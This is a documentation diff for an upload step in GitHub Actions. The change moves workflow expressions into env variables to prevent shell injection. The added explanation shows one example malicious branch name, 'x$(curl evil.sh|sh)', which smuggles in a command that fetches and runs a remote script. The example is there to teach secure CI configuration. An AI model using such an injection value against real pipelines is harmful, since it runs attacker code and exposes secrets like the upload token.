@@ -33,18 +33,27 @@ Upload from a GitHub Actions step, after your tests have written `junit.xml`:
       -H "Authorization: Bearer $FLAKEHUNTER_TOKEN" \
       -H "Content-Type: application/xml" \
       -H "Content-Encoding: gzip" \
-      -H "X-FH-Run-Id: ${{ github.run_id }}" \
-      -H "X-FH-Run-Attempt: ${{ github.run_attempt }}" \
-      -H "X-FH-Sha: ${{ github.event.pull_request.head.sha || github.sha }}" \
-      -H "X-FH-Branch: ${{ github.head_ref || github.ref_name }}" \
-      -H "X-FH-Workflow: ${{ github.workflow }}" \
+      -H "X-FH-Run-Id: $FH_RUN_ID" \
+      -H "X-FH-Run-Attempt: $FH_RUN_ATTEMPT" \
+      -H "X-FH-Sha: $FH_SHA" \
+      -H "X-FH-Branch: $FH_BRANCH" \
+      -H "X-FH-Workflow: $FH_WORKFLOW" \
       --data-binary @-
   env:
     FLAKEHUNTER_URL: https://your-flakehunter-host
     FLAKEHUNTER_TOKEN: ${{ secrets.FLAKEHUNTER_TOKEN }}
+    FH_RUN_ID: ${{ github.run_id }}
+    FH_RUN_ATTEMPT: ${{ github.run_attempt }}
+    FH_SHA: ${{ github.event.pull_request.head.sha || github.sha }}
+    FH_BRANCH: ${{ github.head_ref || github.ref_name }}
+    FH_WORKFLOW: ${{ github.workflow }}
 ```
 
 Use the PR head SHA (as above), not the merge commit, so uploads line up with webhook data.
+
+Every `${{ }}` value goes through `env:` and is used as a quoted shell variable, never pasted into the `run:` script.
+Branch and workflow names are chosen by whoever pushes or opens the pull request, so a name like
+``x$(curl evil.sh|sh)`` written straight into the script would run as a command and could read `FLAKEHUNTER_TOKEN`.
 
 | Header | Required | Meaning |
 | --- | --- | --- |
